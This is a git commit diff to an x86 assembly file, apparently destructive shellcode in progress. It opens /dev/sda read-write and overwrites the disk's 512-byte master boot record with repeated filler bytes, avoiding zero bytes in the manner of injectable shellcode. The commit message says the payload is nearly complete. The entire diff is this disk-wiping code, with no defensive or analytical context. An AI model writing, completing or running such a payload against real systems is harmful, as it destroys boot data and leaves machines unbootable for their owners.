648fcc841f40692bf7bd19d74c28837e7004c5a4
trisna22 <trisna@live.nl>
2021-02-11 14:53:19 +0100

    opening MBR file and writing finished, only one string termination not done yet!

--- overwriteMBR/overwriteMBR.asm
+++ overwriteMBR/overwriteMBR.asm
@@ -9,8 +9,8 @@ section .text
 
 _start:
 	; open the /dev/sda
-	xor eax, eax
-	push eax
+	xor edx, edx
+	push edx
 	push 0x6164732f
 	push 0x7665642f
 	mov ebx, esp
@@ -19,5 +19,25 @@ _start:
 	mov cl, O_RDWR
 	int 0x80
 
-	; write the MBR with zero's
+	; write the MBR with zero's.
+	; with the size of 512 bytes.
+	; (128 * 4 bytes)
 
+	mov ebx, eax		; file pointer to ebx
+	xor edx, edx
+	mov eax, edx		; zero out eax
+
+	mov cl, 128		; counter of loop
+fill:
+	push 0x48414841		; push to stack
+	loop fill
+
+	mov al, SYS_WRITE
+
+	mov ecx, esp
+
+	xor edx, edx		; zero out edx
+
+	; we need to find a way to store 512 without a zero.
+	mov dx, 512
+	int 0x80
